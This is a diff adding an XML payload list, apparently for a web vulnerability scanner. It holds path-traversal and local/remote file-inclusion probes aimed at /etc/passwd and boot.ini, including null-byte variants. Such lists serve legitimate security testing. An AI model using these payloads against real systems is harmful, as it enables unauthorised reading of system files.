@@ -1,0 +1,39 @@
+<?xml version="1.0"?>
+<files>
+	<attack>
+		<name>HTTP Distant file</name>
+		<code>http://www.google.com</code>
+	</attack>
+	<attack>
+		<name>Windows local file insertion</name>
+		<code>c:\\\\boot.ini</code>
+	</attack>
+	<attack>
+		<name>Unix local file insertion</name>
+		<code>/etc/passwd</code>
+	</attack>
+	<attack>
+		<name>Unix local file insertion</name>
+		<code>/etc/passwd\0</code>
+	</attack>
+	<attack>
+		<name>Windows local file insertion</name>
+		<code>c:\\\\boot.ini\0</code>
+	</attack>
+	<attack>
+		<name>Unix local file insertion</name>
+		<code>../../../../../../../../../../etc/passwd</code>
+	</attack>
+	<attack>
+		<name>Unix local file insertion</name>
+		<code>../../../../../../../../../../etc/passwd\0</code>
+	</attack>
+	<attack>
+		<name>Server boot local file insertion</name>
+		<code>../../../../../../../../../../boot.ini</code>
+	</attack>	
+	<attack>
+		<name>Server boot file insertion</name>
+		<code>../../../../../../../../../../boot.ini\0</code>
+	</attack>
+</files>
